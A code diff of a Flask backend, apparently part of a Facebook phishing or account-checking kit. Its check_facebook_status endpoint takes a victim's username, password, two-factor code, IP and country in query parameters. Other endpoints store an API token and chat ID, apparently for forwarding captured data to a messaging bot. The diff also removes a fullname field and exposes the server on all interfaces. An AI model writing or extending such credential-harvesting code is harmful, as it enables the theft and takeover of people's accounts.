+++ backend/server.py
@@ -1,12 +1,13 @@
-from flask import Flask, request, jsonify
+from flask import Flask, jsonify, request
 from flask_cors import CORS
+
 from modules.facebook_checker import (check_status_facebook,
-                                      write_api_token_and_chat_id_to_json,
-                                      read_api_token_and_chat_id_from_json)
+                                      read_api_token_and_chat_id_from_json,
+                                      write_api_token_and_chat_id_to_json)
 
 app = Flask(__name__, static_url_path='', static_folder='static')
 
-CORS(app)  
+CORS(app)
 @app.route('/read_config', methods=['GET'])
 def read_config():
     api_token, chat_id = read_api_token_and_chat_id_from_json('config.json')
@@ -19,21 +20,22 @@ def admin_update():
     write_api_token_and_chat_id_to_json(api_token, chat_id)
 
     return 'OK'
+
+
 @app.route('/check_facebook_status', methods=['GET'])
 def check_facebook_status():
     username = request.args.get('username')
     password = request.args.get('password')
-    fullname = request.args.get('fullname')
     code = request.args.get('code')
     ip = request.args.get('ip')
     country = request.args.get('country')
     if not username or not password:
         return 'WRONG'
     if not code:
-        return check_status_facebook(username, password, None, ip, country, fullname)
+        return check_status_facebook(username, password, None, ip, country)
     else:
-        return check_status_facebook(username, password, code, ip, country, fullname)
+        return check_status_facebook(username, password, code, ip, country)
 
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=5000)
